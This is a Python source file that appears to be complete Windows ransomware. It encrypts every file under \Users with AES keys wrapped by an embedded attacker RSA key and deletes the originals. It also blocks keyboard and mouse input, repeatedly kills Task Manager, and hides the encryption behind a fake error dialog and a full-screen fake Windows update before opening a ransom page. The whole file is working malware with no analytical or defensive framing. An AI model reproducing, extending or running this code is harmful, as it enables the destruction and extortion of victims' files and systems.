import pythoncom, pyWinhook
import multiprocessing, subprocess
import os, ctypes
import time
import sys
from lockfile import LockFile
import win32gui, win32con
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from base64 import b64encode, b64decode



# 8k
my_public_key = b'0\x82\x04"0\r\x06\t*\x86H\x86\xf7\r\x01\x01\x01\x05\x00\x03\x82\x04\x0f\x000\x82\x04\n\x02\x82\x04\x01\x00\xcaY\xca"\x86Km\xb0#\x1d\x025\xa2(Ip\x06\xea\x93t\xf2%i\xa9]:\xe5\x1d%o-\x9dHR\xb4_N\x02\x9e\x05hF\xfc%\x7fdaPC4\xd1\x11\xb6\x1aPa\x0f\x0f\xa7\x81\xdc]\x80\x1a60\x87B\xf7s=c$b\xf8a\x12\xd5\xd0C\xcc\xdd\xe9\x0cz\xc4\xdf\xe7\x85\xb1\x92\x8f\xc2\x83.p\x91\x1b\xe3jQ\xb5\xd0\x0e1\xb6\x97\xff\x1aP\xbbL\xba\x8b\xe5\'\x0f\xcf\xb5b\xf9\x0ct\x19\x8c`\x88\xdb\x98\x8c4\xce\xb3xx\x82\x87=\xfc\xcc*\x8a\x9c\x16\x8b\xef2\xb2\x95o\xa2\xae\x1d\xb1?UJ\xfdD:\\\xd9\x0bB\n\x90\xe9\xef\xd9.\x98qf\xfd\xa1\x80\n\x15>\x0clT\x93\x90\xc2\xbe\xd9\xd7\xbc\xa9\xd1\xb7\x0e[\xff9$\x1e\t|\xda\xca\xaa\xaa\x1do\xc8\xf7\xbf\x16\xab\xd4Q&\x0b\x8cN\xa4\x0e\xe03\xadD\x0b7\r\xb4\xfb\x89(\xbci<^\xef\x8b\x1cT\xeb\xdbg\xaa\xf7u5\xe2!\xa0\xb5\xda!\xdf\x14\\r\x8c\xe5\x94\xd7\\\x19F\x9dx\xd5K\xbd\xf5\x08\xecVR\xfc2\xe4\x84\xfc\xc4`W\xbb\xfet^v?\x8d\x0b\xc9c\xb8\xcd?,\x11\xe8\xa2\xcf\xba\x1eY\xa6\x99*<=\xbb\x98R\x97kIz\xad[\xd7\x1dN9*\x84\x9f\xbe\x9a\xd4\x92\x91\x85\xc4LX9wH\xdb;\x1c\x17\x85\xf0+\x01\xd8\x07\x91l\xbdX\x11#\xc8\xd3\xf4\xf7\xff\xa8g\x8a\xdae\x1b\x9d\\\xa8\xfd\x18?\xd4\xa9\x9b\x9a\xab\xb5a\xf9\xb3X\xce\xa8\xcc;\xf4\xdc\x7f\xdeT\x1a\x13\xba\xb9\x1f\xa1\xc6l\x8d\x9f\xabb\xe35\xde\x1el\xbb\xe1\xce\x19\x82`\t,ekC\xecC\xc9\x89\xed Hl\xae\x1f-R\xfa\xc2\x19\xb9\x12\x1c\xe5\xf8\xe6W>\x93\x18\x97G\xdb\xe5^\x8f[l\xbc\xb0\x00\x9b\xd7\xac\x8d\xc8a\xbd\xab+\x16\xdb\xcd\xbc\x17\xedp.\xd9\xd6\x0b\xd2\xf7b\xbd\x9c\xf6\xb61\xf1d^K}\xd5\xcc\x16Y\xfeu-\x10\xcf\xd1\xe8j\x1c\xc4c6\xbf5\\\x94r09\xfd\x08\xd4yL\x80\xb4x\x8c\xde\xa7\x83\xa2\x8a\xa3\x08i6\x1c\xf9\xc6\xb9(\xdcc\x06\xdd\x7f\xa1\xa9\xc5P\x93C\x15\x88Q!Y6(z\x00D\'.Y\x8bBi\x9c\x88\x07\xeb\xe9i\x07A\xff~\xe6"w\xea\xc7\xd7r\x98r\xafl\x8c\x88\x070\x9f\t\x92\'b\xbe\x05_\xd3\xff\xe1\xd1\xb1\x80\x98\x1d\xbbb\xeb4\x19i8Qm\xf7\xbd\\\x9b.`\x9c\xbf/\x83I\xc3\xac\x16^\x9e\xa7\xd1\x1f\xf5NaK\xce!H\x0cl\xbb\xe9\x8cb\xb97)\xd2\xf9\xf59\xbe\xafVx\x84\xd35\x96)\xfa\xd4e\x92I\x9a\t\x04\x13\xbc\xf5a\xee\x1f\xd3\xffi\x99t\x89\xd2\xc3jz\xc5\x1b8\xa6{:\xf3Z\x10;O"E\xd8\x86Z\x8c\x17\'\xa5\xa0\x1b5b\xcfU\x1f(O\x16\xb3e\x03b;\x9d4\xb7\ty3\x96 5\x13\x97\xe44\xc5\xc3\xde`\xc6\x8f\xd5\nh\xb2RV\x95Dz\x94\xb6f\xa7\x03-\x9ai\xf1\xb0\xbb\xbb\x86\xa1g@{@\x10\xa2\x8fL\xc6\xba\x8be<\xfb\x8cJCj\xd4>\x97\xe0\x8b\x02\xca\xe5\xcb\x05\xf40\x02\x98#\xba3y\x9e\x99\xecovP\xfa-\xdb?\x92\xbe\x12\x9e\x83Q:E\x11\xc5\x94qX\xf8\xdf\x1a\xf7\xfa\x04\xf9\r\xbe\x17\x84\x113\xfa\xc1\xe2\xf4\xd1\xfc2\xb1|\xde7@\xee\x0c+\x92\x03\x92\x07\xeeg9=\x8c\xf9o\x9fi0\xa6gK\xd5\xb9!l\xb4\xc6\xbc\xf5j\\_\xfc\xa5\x15#\xd7[\x13~\xce\xacs\x1e\x12\x1d\xd8\x11\x93ev\x98\xef\xfe\x0b,\xe3\xab\x91~hy\xcd\x85-R\xf16\xe6\x8b\xa9N\xeb\xba\x0ca\n\x15\xf30[\xa1q*e\n\xa0\x00\x9eI\xeb\t\xdf,?\xa6\xc0\t\xe4Z\x9d\x1c\xafQRZ\x9d\x98X%\x15\xac\x01\xea(\xee\x92\xc6D\xec\xe7\xcd\x83\xd8\xd5\xe6\x1a\x8b\xf0\xa2\xb25%8\xca\x98\xc2\x1e\x86\xf8\x06:B\xf9\xcbHu\xc6\xe3\xfb\xbe)K\xb4Y\x01\x92\x18{@T\x0b\xcb\\\xf7:\xd7\x83\x8d\x84=3\xa8\x02\x8fP*\x9a\x19\xd9\xc2\x9d\xd9\x9dp\xfb\x02\x03\x01\x00\x01'
victim_priv_key_enc = b''
victim_cipher = ''  # object
encrypted_using_asymmetric_keys_postfix = '.shhh'
encrypted_using_symmetric_keys_postfix = '.opalq'
assymetric_encrypted_victim_key_postfix = '.opa'
modules_postfix = '.ddli'
file_chunk_size = 2048
victim_key_size = 1024
target_directory = '\\Users'
#target_directory = '\\Users\\zdrav\\Desktop\\putkorazbivach3000\\test_ground\\test_zone'


# File extensions we identify for decryption
encrypted_extensions = [encrypted_using_asymmetric_keys_postfix, encrypted_using_symmetric_keys_postfix]
# File extensions we do not touch
do_not_encrypt = [encrypted_using_asymmetric_keys_postfix, encrypted_using_symmetric_keys_postfix, assymetric_encrypted_victim_key_postfix, modules_postfix]

desktop_path = os.environ['USERPROFILE'] + '\\Desktop\\'
 
### song
song_path = 'sModuleWinddl.ddli'

### website
site_path1 = 'w1ModuleWinddl.ddli'
site_path2 = 'w2ModuleWinddl.ddli'

# Used for enumerating the wndows before the fake update
toplist = []
winlist = []

### Encryption

# Save the victim's private key (encrypted of course)
def save_victim_key():
    my_cipher = PKCS1_OAEP.new(RSA.importKey(my_public_key))
    victim_key = RSA.generate(victim_key_size)
    global victim_cipher
    victim_cipher = PKCS1_OAEP.new(RSA.importKey(
        victim_key.publickey().export_key('DER')))
    f = open(desktop_path + 'GIVE_THIS' + assymetric_encrypted_victim_key_postfix, 'wb')
    f.write(my_cipher.encrypt(victim_key.export_key('DER')))
    f.close()

    # Delete the private key from RAM
    del victim_key
    del my_cipher
    #return victim_cipher

### File extensions

# get file with symmeytic encryption
def get_symmetricly_encrypted_absolute_path(absolute_path):
    head, tail = os.path.split(absolute_path)
    return head + '\\' + tail + encrypted_using_symmetric_keys_postfix

# get file with asymmeytic encryption
def get_asymmetrically_encrypted_absolute_path(absolute_path):
    head, tail = os.path.split(absolute_path)
    return head + '\\' + tail + encrypted_using_asymmetric_keys_postfix


def get_original_symmetricly_encrypted_absolute_path(absolute_path):
    head, tail = os.path.split(absolute_path)
    return head + '\\' + tail.removesuffix(encrypted_using_symmetric_keys_postfix)


def get_original_asymmetrically_encrypted_absolute_path(absolute_path):
    head, tail = os.path.split(absolute_path)
    return head + '\\' + tail.removesuffix(encrypted_using_asymmetric_keys_postfix)


def get_asymmetrically_encrypted_absolute_path_from_symmetrically_encrypted(absolute_path):
    head, tail = os.path.split(absolute_path)
    return head + '\\' + tail.removesuffix(encrypted_using_symmetric_keys_postfix) + encrypted_using_asymmetric_keys_postfix

def get_file_extension(file_name):
    return os.path.splitext(file_name)[1]

### Encrypt files and symmetric keys

# Encrypts the symmetric key of the file
def encrypt_asymmetric_key(absolute_path, key, nonce):
    nonce_key = nonce + key
    f = open(get_asymmetrically_encrypted_absolute_path(absolute_path), 'wb')
    f.write(victim_cipher.encrypt(nonce_key))
    f.close()



# Encrypt the file using the symmetric key and nonce (with AES)
def encrypt_symmetric_key(absolute_path, key, nonce):
    aes_cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    try:
        f = open(absolute_path, 'rb')
        d = open(get_symmetricly_encrypted_absolute_path(absolute_path), 'wb')
        while True:
            src_data = f.read(file_chunk_size)  # 2 kb at a time
            if not src_data:  # ran out of data
                break
            d.write(aes_cipher.encrypt(src_data))
        f.close()
        d.close()
        os.remove(absolute_path)
    except:
        print('Failed to encrypt')

# Encypt the file as well as its key
def encrypt_file(absolute_path):
    nonce = get_random_bytes(16)
    key = get_random_bytes(32)
    try:
        encrypt_asymmetric_key(absolute_path, key, nonce)
        encrypt_symmetric_key(absolute_path, key, nonce)
    except:
        print('Failed to encrypt with asymmetric keys')

### Encrypters

def encrypt_directory(absolute_path):
    save_victim_key() # set up

    # Traverse the filesystem
    for root, dirs, files in os.walk(absolute_path):
        for file in files:
            # Do not encrypt the file if we already encrypted it
            if (get_file_extension(file) not in do_not_encrypt):
                encrypt_file(root + '\\' + file)


### Process blockage

### Function that blocks the events captured by the program
def uMad(event):
    return False

### Blocks input from keyboard and mouse buttons
def block():
    hm = pyWinhook.HookManager()
    # Block all buttons
    hm.KeyAll = uMad
    hm.MouseAllButtons = uMad

    # Hook up the hook manager
    hm.HookKeyboard()
    hm.HookMouse()

    # Makes the subprocess wait for windows event messages and responds to them
    pythoncom.PumpMessages()

### Custom function that only enumerates the windows that are visible
def enum_callback(hwnd, results):
    # the windows we minimize need to be visible and have text in their name
    # (if they have no title they are probably other Windows artifacts on the screen)
    if win32gui.IsWindowVisible(hwnd) and len(win32gui.GetWindowText(hwnd)) > 0:
        winlist.append((hwnd, win32gui.GetWindowText(hwnd)))

### Launches the fake update
def update():
    # Enumerate the visible windows
    win32gui.EnumWindows(enum_callback, toplist)
    windows = [(hwnd, title) for hwnd, title in winlist]

    # Iterate through all windows
    for w in windows:
        # Minimize them
        win32gui.ShowWindow(w[0], win32con.SW_MINIMIZE)
    
    # Start edge quietly (no CMD window)
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.call('"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk fakeupdate.net/win10ue --edge-kiosk-type=fullscreen --no-first-run', startupinfo=si)

### Launches the fake error message
def errorMessage():
    ctypes.windll.user32.MessageBoxW(0, "The program can't start because MSVCP140.dll is missing from your computer. For more information visit https://docs.microsoft.com/en-us/cpp/windows/latest-supported-vc-redist", "Setup.exe - System Error", 0x10)

### Moves the song information to a .mp3 file
def write_song():
    try:
        f = open(song_path, 'rb')
        d = open(desktop_path + 'song.mp3', 'wb')
        d.write(f.read())
        f.close()
        d.close()
    except:
        print('Failed to write sModule')

### Decodes the website from its base64 parts into an html
def write_website():
    try:
        # Read the encrypted key so it can be shown as text on the website
        opa = open(desktop_path+ 'GIVE_THIS.opa', 'rb')
        encr_key = opa.read()
        opa.close()

        # Write the website
        f1 = open(site_path1, 'rb')
        f2 = open(site_path2, 'rb')
        d = open(desktop_path + 'site.html', 'wb')

        d.write(b64decode(f1.read()) + b64encode(encr_key) + b64decode(f2.read()))

        f1.close()
        f2.close()
        d.close()
    except:
        print('Failed to write wModule')

### Main
if __name__ == '__main__':

    # Get desktop path
    desktop_path = os.environ['USERPROFILE'] + '\\Desktop\\'

    # Required for compiling to .exe
    multiprocessing.freeze_support()

    # Launch the error message
    errorProcess = multiprocessing.Process(target=errorMessage, args = ())
    errorProcess.start()

    # Generate a file to lock onto later
    try:
        f = open("lock", 'w')
        f.close()
    except:
        pass
    
    # Lock the file
    lock = LockFile("lock.txt")
    while not lock.i_am_locking():
        try:
             # Wait up to 5 seconds
            lock.acquire(timeout=5)
        except:
            # Another process has the lock over the file
            # Probably another instance of this program, abort
            sys.exit(0)
            
    with lock:
        # Wait a bit before starting
        begin = time.time()
        while time.time() - begin < 60:
            pass

        # Block inputs
        blockProcess = multiprocessing.Process(target = block, args = ())
        blockProcess.start()

        # Show update screen
        updateProcess = multiprocessing.Process(target = update, args = ())
        updateProcess.start()

        # Start encrypting
        encryptProcess = multiprocessing.Process(target=encrypt_directory, args = (target_directory,))
        encryptProcess.start()
    
        # Subprocess info so that the taskmgr kill does not open a console
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    
        # Wait until the encryption is done
        while encryptProcess.is_alive():
            # Continuously kill task manager so the user cannot open it
            subprocess.call('taskkill /F /IM taskmgr.exe', startupinfo = si)
        
        # Prepare our website
        write_song()
        write_website()
        
        # Stop the 'update'
        blockProcess.terminate()
        updateProcess.terminate()
        subprocess.call('taskkill /F /IM msedge.exe', startupinfo = si)

        # Open our website
        subprocess.call('"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --kiosk ' + desktop_path + 'site.html --no-first-run')

